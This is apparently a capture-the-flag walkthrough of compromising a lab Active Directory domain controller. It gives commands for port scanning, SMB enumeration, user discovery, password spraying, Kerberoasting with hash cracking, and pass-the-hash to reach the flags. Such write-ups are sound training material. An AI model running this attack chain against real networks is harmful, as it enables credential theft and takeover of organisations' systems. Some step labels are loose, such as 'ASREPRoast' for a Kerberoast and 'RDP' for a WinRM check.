- I start with a scan of the open ports
  
  ```bash
  nmap -p- --open --min-rate 5000 -sS -Pn 10.0.2.4 -oG scan
  ```

- I continue with a scan of the versions and technologies that are running on the open ports that we have found
  
  ```bash
  nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49671,49686 -sCV -Pn 10.0.2.4 -oN ports
  ```

- I list the resources shared by smb
  
  ```bash
  smbmap -H 10.0.2.4 -u 'guest'
  ```

- Seeing that I have read permissions on IPC$ I can list system users. When I have a list of potential users I run it through crackmapexec to validate them
  
  ```bash
  impacket-lookupsid SOUPEDECODE@10.0.2.4 -no-pass
	
  crackmapexec smb 10.0.2.4 -u users -p "" --shares --continue-on-success
  ```

- I am trying to remove users that use the same password as your own user, I find user ybob317
  
  ```bash
  netexec  smb 10.0.2.4 -u users_potencial  -p users_potencial  --no-bruteforce --continue-on-success | grep -v "[-]"
  ```
  
  ![image4](https://github.com/user-attachments/assets/30d238c3-7bcc-4474-bddf-0a50efe57a8f)

- I list with the found credentials the smb resources, I can list new folders and inside them I find the first flag
  
  ```bash
  smbmap -H 10.0.2.4 -u 'ybob317' -p 'ybob317'
  ```
  
  ![image5](https://github.com/user-attachments/assets/0a430a08-f298-40ec-bf0f-e64aadc810ba)
  
- I check if this user has permissions to connect via RDP
  
  ```bash
  crackmapexec winrm 10.0.2.4 -u "ybob317" -p "ybob317"
  ```
  
  ![imagee](https://github.com/user-attachments/assets/de0a1453-46f0-4a40-b7bc-f7a7be36c91c)

- I try to get user hashes through an ASREPRoast, without providing credentials I get nothing but using ybob317's credential I manage to dumpe several hashes
- I notice that I get an error due to a time difference between the machine and my computer, I adjust it with ntpdate
  
  ```bash
  ntpdate 10.0.2.4
  impacket-GetUserSPNs -request -dc-ip 10.0.2.4 SOUPEDECODE.LOCAL/ybob317:ybob317 -outputfile hashes.kerberoast
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
  ```
  
  ![image6](https://github.com/user-attachments/assets/4afc969a-ffe7-42cd-bda7-ec9c5047b166)

- With these new credentials I can view the contents of a new folder and I get a file containing hashes of several users
  
  ![image7](https://github.com/user-attachments/assets/3b740547-a8e6-49b2-8a29-52d5ba7170e4)
  ![image8](https://github.com/user-attachments/assets/595e146b-0a3c-4645-ae4c-216842db5944)


- I check if the hashes found belong to any user and I can do pass-the-hash (PtH). I find a user with whom I can do this attack and when I put Pwn3d! it tells me that I can connect to the machine
- When I log in I see that I have enough permissions to read the second flag
  
  ```bash
  netexec smb 10.0.2.4 -u a -p hahses --continue-on-success 
  ```
